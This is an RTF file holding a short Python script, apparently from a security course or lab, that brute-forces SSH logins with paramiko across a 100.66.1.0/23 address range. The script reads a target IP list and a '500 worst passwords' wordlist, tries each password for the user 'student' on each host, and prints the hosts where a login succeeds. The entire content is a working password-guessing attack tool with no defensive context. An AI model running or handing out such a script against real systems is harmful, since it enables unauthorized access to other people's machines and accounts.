{\rtf1\ansi\ansicpg1252\cocoartf1671\cocoasubrtf500
{\fonttbl\f0\fmodern\fcharset0 CourierNewPSMT;}
{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red255\green255\blue255;\red16\green60\blue192;
}
{\*\expandedcolortbl;;\cssrgb\c0\c0\c0;\cssrgb\c100000\c100000\c100000;\cssrgb\c6667\c33333\c80000;
}
\margl1440\margr1440\vieww10800\viewh8400\viewkind0
\deftab720
\pard\pardeftab720\partightenfactor0

\f0\fs24 \cf2 \cb3 \expnd0\expndtw0\kerning0
# This is the python script 
\fs26 for ssh\'92ing into the environment {\field{\*\fldinst{HYPERLINK "http://secure-web.cisco.com/17IweUwqTFXxW9TTVB_BS04AiuQ8H2M2RNhomU4IEJ2ehP6UXaHmvsvEMeR7FbbYe_Wj-rF7MzA_VIS-mAXqfCOvhJuqPnITKip-b212fsD5l-bPtVcb9mtTp4uSgwBaRRuSxm4JxkVvk5HnNoHy4-7sMnO77Jgo_UiPjXZOkv6txeWluesi6ydAgwRpg-aYpLAEp_obVHFZaoTCTTuy4s9uXeqHXGohKbFg5NT3Pfb4tjFsvwLAa46DsOgsx6xpzwvXBi2QCRAHMBYG5ZUIdzvHzjjYR-92De1A92XKkHC_zOZpw_fcoYpdgkGpO4fQ8BqIRziY7Xm3XNRF8xKnnVpK1VHxV0V7YXp-9NwuhLDrAP33heLmASkvvu1v5SX2XLVnMuK-SywwEWvKlEcV3iQawe5dy-Yyp9ZynQ3URGwKZ9pfKtAVn86f3FpgOgasuxIWV2-LR7UBMpKK44HZ1ow/http%3A%2F%2F100.66.1.0%2F23"}}{\fldrslt \ul \ulc4 100.66.1.0/23}} using paramiko\'97 brute-force BurpSuite Repeater
\fs24 \

\fs26 \

\fs24 \
\
import requests\
from os import getcwd\
import argparse\
import paramiko\
\
Username = 'student'\
passwordFile = '/Users/purnima/500-worst-passwords.txt'\
\
passwords = open(passwordFile, 'r')\
pp = passwords.readlines()\
\
client = paramiko.SSHClient()\
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\
\
IP = open("/Users/purnima/ipfile.txt", 'r')\
ips = IP.readlines()\
\
for ip in ips:\
    for passwd in pp:\
        try:\
            client.connect(ip.strip('\\n'), username=Username, password=passwd.strip('\\n'))\
\
            print('connected' + ip)\
        except Exception as e:\
            pass\
}